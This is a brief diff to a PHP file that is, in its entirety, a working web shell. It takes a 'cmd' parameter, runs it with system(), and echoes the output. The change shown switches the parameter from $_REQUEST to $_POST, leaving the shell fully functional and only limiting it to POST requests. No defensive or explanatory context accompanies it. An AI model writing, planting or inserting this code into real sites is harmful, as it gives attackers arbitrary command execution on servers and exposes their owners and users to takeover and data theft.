@@ -1,8 +1,8 @@
 <?php 
 
-if(isset($_REQUEST['cmd'])) {
+if(isset($_POST['cmd'])) {
   echo "<pre>";
-  $cmd = ($_REQUEST['cmd']);
+  $cmd = ($_POST['cmd']);
   system($cmd);
   echo "</pre>";
   die;
